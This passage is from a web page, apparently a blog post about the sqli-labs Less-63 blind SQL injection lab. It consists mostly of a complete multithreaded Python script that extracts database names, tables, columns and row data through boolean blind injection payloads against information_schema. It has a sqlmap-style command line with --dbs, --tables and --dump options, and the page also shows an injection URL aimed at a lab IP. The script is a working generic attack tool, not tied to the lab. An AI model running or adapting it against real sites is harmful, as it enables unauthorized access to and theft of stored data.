[%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求\"><a href=\"#sqli-labs-lession-63-GET-盲注-变化2-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求\"></a>sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>闭合点</p>\n<p><code>http://10.60.17.35:8082/Less-63/?id=1&#39;+and+1=1%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-63/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-63/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-63/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-63/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span 